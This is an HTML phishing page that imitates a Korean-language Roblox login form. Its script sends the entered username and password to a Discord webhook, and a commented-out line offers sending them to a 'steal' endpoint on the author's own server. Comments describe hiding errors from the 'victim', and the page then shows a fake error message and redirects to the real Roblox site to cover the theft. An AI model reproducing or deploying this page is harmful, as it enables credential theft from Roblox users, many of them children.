<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Roblox</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, 'Source Sans Pro', sans-serif;
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 24px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .logo { width: 120px; margin-bottom: 10px; }
        h1 { 
            font-size: 24px; 
            color: #1a1a2e; 
            margin-bottom: 5px;
        }
        .subtitle { 
            color: #666; 
            font-size: 14px; 
            margin-bottom: 30px; 
        }
        input {
            width: 100%;
            padding: 15px;
            margin: 8px 0;
            border: 2px solid #ddd;
            border-radius: 12px;
            font-size: 16px;
            background: #f8f9fa;
        }
        input:focus {
            border-color: #00bcd4;
            outline: none;
            background: white;
        }
        button {
            width: 100%;
            padding: 15px;
            background: #00bcd4;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            margin-top: 15px;
            cursor: pointer;
        }
        button:hover { background: #0097a7; }
        .error { 
            color: #e74c3c; 
            font-size: 14px; 
            margin-top: 10px;
            display: none;
        }
        .footer { margin-top: 20px; font-size: 12px; color: #999; }
    </style>
</head>
<body>
    <div class="container">
        <svg class="logo" viewBox="0 0 100 100">
            <rect width="100" height="100" rx="20" fill="#00bcd4"/>
            <text x="50" y="65" text-anchor="middle" fill="white" font-size="40" font-weight="bold">R</text>
        </svg>
        <h1>Roblox에 로그인</h1>
        <p class="subtitle">계정에 접속하여 친구들과 함께 플레이하세요</p>
        
        <form id="loginForm">
            <input type="text" id="username" placeholder="사용자 이름 / 이메일 / 전화번호" required>
            <input type="password" id="password" placeholder="비밀번호" required>
            <button type="submit">로그인</button>
        </form>
        
        <div class="error" id="errorMsg">사용자 이름 또는 비밀번호가 올바르지 않습니다.</div>
        <div class="footer">© 2025 Roblox Corporation</div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            
            // ==========================================
            // 여기서 훔친 정보를 어디로 보낼지 정해야 함
            // ==========================================
            
            // 방법 1: Discord 웹후크로 보내기
            var webhookURL = 'https://discord.com/api/webhooks/여기에_웹후크_URL_넣기';
            
            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: '**Roblox 계정 탈취!**',
                    embeds: [{
                        title: '새로운 계정 정보',
                        fields: [
                            { name: '사용자 이름', value: username, inline: true },
                            { name: '비밀번호', value: password, inline: true }
                        ],
                        color: 0x00bcd4,
                        timestamp: new Date().toISOString()
                    }]
                })
            }).catch(function(err) {
                // 에러 무시 - 피해자에게 티 안 나게
            });
            
            // 방법 2: 내 서버로 보내기 (Webhook이 안 될 경우)
            // fetch('https://내서버.com/steal?u=' + encodeURIComponent(username) + '&p=' + encodeURIComponent(password));
            
            // 피해자 속이기
            document.getElementById('errorMsg').style.display = 'block';
            
            // 2초 후 진짜 Roblox로 이동
            setTimeout(function() {
                window.location.href = 'https://www.roblox.com/login';
            }, 2000);
        });
    </script>
</body>
</html>
